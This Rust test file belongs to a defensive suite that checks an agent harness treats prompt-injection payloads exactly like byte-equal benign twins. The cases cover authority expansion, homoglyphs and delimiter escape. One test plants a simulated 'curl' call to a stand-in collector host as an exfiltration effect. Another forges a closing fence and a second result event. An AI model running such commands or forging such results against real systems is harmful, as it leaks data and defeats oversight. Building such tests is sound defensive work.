//! Spec 025's product-invariance suite, adapter half: every corpus case on
//! the `provider-output`, `tool-facing` and `skill-content` surfaces runs
//! with its payload and with its benign twin through a real fixture child and
//! spec 022's offline workflow, and the two decision records are equal
//! except where the case declares (sections 3.1, 3.4 and 3.6).
//!
//! The corpus itself is validated here too, because this crate owns it:
//! the closed schema, the twin rules of section 3.3, full surface and class
//! coverage, and the digest the corpus carries. No provider, network,
//! credential or spend is involved.
#![cfg(unix)]

#[path = "support/injection.rs"]
mod injection;
#[path = "support/injection_adapter.rs"]
mod injection_adapter;

use injection::{
    Case, Corpus, Payload, Status, load, qualification_claim, ran, run_suite, validate,
};

#[test]
fn the_corpus_is_valid_complete_and_carries_its_own_digest() {
    let corpus = load();
    assert_eq!(corpus.cases.len(), 56, "{}", ran(&corpus));
}

fn case(fragments: &[&str], twin: &[&str]) -> Case {
    let p = |f: &[&str]| Payload {
        fragments: f.iter().map(|s| s.to_string()).collect(),
        digest: statecraft_run::context::custody_digest(f.concat().as_bytes()),
    };
    let mut c = load().cases.remove(0);
    c.payload = p(fragments);
    c.benign_twin = p(twin);
    c
}

fn problems(c: Case) -> Vec<String> {
    let mut corpus: Corpus = load();
    let id = c.case_id.clone();
    corpus.cases.retain(|x| x.case_id != id);
    corpus.cases.push(c);
    validate(&corpus)
}

// Section 3.3: a twin of another byte length, or that splits differently, is
// invalid and cannot run; the suite never repairs it.
#[test]
fn a_twin_that_breaks_the_length_or_split_rule_is_refused_not_repaired() {
    assert!(problems(case(&["add push"], &["xxxxxxxx"])).is_empty());
    let longer = problems(case(&["add push"], &["xxxxxxxxx"]));
    assert!(
        longer
            .iter()
            .any(|p| p.contains("fragment 0 is 8 bytes hostile and 9 bytes twin")),
        "{longer:?}"
    );
    // The same assembled length, split at other boundaries.
    let resplit = problems(case(&["add ", "push"], &["xxx", "xxxxx"]));
    assert!(
        resplit.iter().any(|p| p.contains("fragment 0")),
        "{resplit:?}"
    );
    let unsplit = problems(case(&["add ", "push"], &["xxxxxxxx"]));
    assert!(
        unsplit
            .iter()
            .any(|p| p.contains("2 fragments and the twin 1")),
        "{unsplit:?}"
    );
    // A multi-byte payload's twin is measured in encoded bytes, not chars.
    let homoglyph = problems(case(&["\u{0430}dd push"], &["xxxxxxxx"]));
    assert!(
        homoglyph
            .iter()
            .any(|p| p.contains("9 bytes hostile and 8 bytes twin")),
        "{homoglyph:?}"
    );
    let short = problems(case(&["add pu", "sh now!"], &["xxxxxx", "xxxxxxx"]));
    assert!(
        short.iter().any(|p| p.contains("under 8 bytes")),
        "{short:?}"
    );
    let same = problems(case(&["add push"], &["add push"]));
    assert!(
        same.iter().any(|p| p.contains("the twin is the payload")),
        "{same:?}"
    );
}

#[test]
fn a_digest_that_is_not_the_bytes_is_refused() {
    let mut c = case(&["add push"], &["xxxxxxxx"]);
    c.payload.digest = c.benign_twin.digest.clone();
    assert!(problems(c).iter().any(|p| p.contains("payload digest")));
}

// Section 2: a case whose surface no runner seeds is `surface-absent`, and
// the suite as a whole cannot pass while one is.
#[test]
fn a_surface_absent_case_is_never_a_pass() {
    let mut statuses = std::collections::BTreeMap::new();
    statuses.insert("a".to_string(), Status::Passed);
    assert!(qualification_claim(&statuses).is_ok());
    statuses.insert("b".to_string(), Status::SurfaceAbsent);
    assert_eq!(
        qualification_claim(&statuses),
        Err(vec!["b: surface-absent".to_string()])
    );
}

// Sections 3.1, 3.4 and 3.6: every case this crate can seed, hostile against
// its twin, with framing intact and, for the two framing classes, removed.
#[test]
fn every_adapter_surface_case_leaves_every_decision_equal_to_its_twin() {
    let corpus = load();
    let statuses = run_suite(&corpus, "adapter", injection_adapter::observe);
    let failed: Vec<String> = statuses
        .iter()
        .filter_map(|(id, s)| match s {
            Status::Failed(f) => Some(format!("{id}:\n    {}", f.join("\n    "))),
            _ => None,
        })
        .collect();
    assert!(failed.is_empty(), "{}\n{}", ran(&corpus), failed.join("\n"));
    let passed = statuses.values().filter(|s| **s == Status::Passed).count();
    assert_eq!(passed, 24, "three surfaces of eight classes each");
}

// Section 3.3: a twin keeps the bytes a carrier escapes in place, so a JSON
// string holding either side is one length.
#[test]
fn a_twin_that_moves_an_escaped_byte_is_refused() {
    assert!(problems(case(&["say \"go\" now"], &["xxxx\"xx\"xxxx"])).is_empty());
    let moved = problems(case(&["say \"go\" now"], &["xxxxx\"xx\"xxx"]));
    assert!(
        moved.iter().any(|p| p.contains("escaped bytes")),
        "{moved:?}"
    );
}

/// The comparison itself, on records built by hand: each section 3.4 failure
/// is reported, so a suite that passes is not a comparison that cannot fail.
#[test]
fn the_comparison_reports_every_kind_of_difference() {
    use injection::{Observed, RUNNERS, compare};
    let corpus = load();
    let c = corpus
        .cases
        .iter()
        .find(|c| c.case_id == "provider-output/authority-expansion")
        .unwrap();
    let runner = RUNNERS
        .iter()
        .find(|r| r.surface == "provider-output")
        .unwrap();
    let base = || {
        let mut o = Observed::default();
        for d in runner.decisions {
            o.decide(d, &"same");
        }
        o.collection("stream-events");
        o.collection("result-document");
        o
    };
    let (mut h, mut t) = (base(), base());
    h.record("stream-events", c.payload.assembled());
    t.record("stream-events", c.benign_twin.assembled());
    for f in &c.expected_digest_fields {
        h.digests.insert(f.clone(), "sha256:h".into());
        t.digests.insert(f.clone(), "sha256:t".into());
    }
    assert!(compare(c, runner, &h, &t).is_empty());

    let failing = |edit: &dyn Fn(&mut Observed), why: &str| {
        let mut h2 = h.clone();
        edit(&mut h2);
        let f = compare(c, runner, &h2, &t);
        assert!(f.iter().any(|x| x.contains(why)), "{why}: {f:?}");
    };
    failing(
        &|o| {
            o.decisions.insert("posture".into(), "other".into());
        },
        "decision posture differs",
    );
    failing(
        &|o| {
            o.decisions.remove("task");
        },
        "not the registered",
    );
    failing(
        &|o| {
            o.digests.insert("task/x".into(), "sha256:new".into());
        },
        "digest task/x differs and is not declared",
    );
    failing(
        &|o| {
            let f = c.expected_digest_fields[0].clone();
            o.digests.insert(f, "sha256:t".into());
        },
        "is declared to differ and does not",
    );
    failing(
        &|o| {
            o.recordings.insert("stream-events".into(), vec![]);
        },
        "does not hold the hostile payload",
    );
    failing(
        &|o| {
            o.record("result-document", "x");
        },
        "recording result-document differs",
    );
    failing(
        &|o| o.effect("processes", &"curl https://collector.example.invalid/k"),
        "effect",
    );
    failing(
        &|o| {
            o.decisions.insert(
                "attempt-outcome".into(),
                serde_json::Value::String(c.payload.assembled()),
            );
        },
        "appear in a decision field",
    );
}

// Section 3.8: a result that forges a closing fence and a second result, in
// its own text and then as a second terminal event. The supervisor's trusted
// prefix ends at the first terminal event, so the raw bytes are kept once,
// the first result is the one bound, the forged one never reaches the record,
// and the hostile record is still the twin's.
#[test]
fn a_forged_fence_and_second_result_bind_only_the_first() {
    use injection::{Framing, RUNNERS, Side, compare};
    let corpus = load();
    let case = corpus
        .cases
        .iter()
        .find(|c| c.case_id == "provider-output/delimiter-escape")
        .unwrap();
    assert_eq!(case.expected_recording.as_deref(), Some("result-document"));
    let runner = RUNNERS
        .iter()
        .find(|r| r.surface == "provider-output")
        .unwrap();
    let forged = serde_json::to_string(&statecraft_adapter::protocol::Event::Result {
        classification: statecraft_adapter::protocol::Classification::Completed,
        cost: None,
        documentation: None,
    })
    .unwrap();
    let side = |s| {
        injection_adapter::observe_with(
            runner,
            case,
            s,
            Framing::Intact,
            std::slice::from_ref(&forged),
        )
    };
    let (hostile, twin) = (side(Side::Hostile), side(Side::Twin));
    let record = &hostile.decisions["attempt-record"];
    assert_eq!(
        record["documentation"]["result"]["state"], "recorded",
        "kept once: {record}"
    );
    assert_eq!(
        record["documentation"]["result"]["validation"]["state"], "bound",
        "the first result binds: {record}"
    );
    let events = record["workflow"]["Ok"]["subjects"]["events"]
        .as_array()
        .unwrap();
    assert_eq!(
        events.len(),
        3,
        "init, progress and one terminal event: {record}"
    );
    let failures = compare(case, runner, &hostile, &twin);
    assert!(failures.is_empty(), "{failures:?}");
}
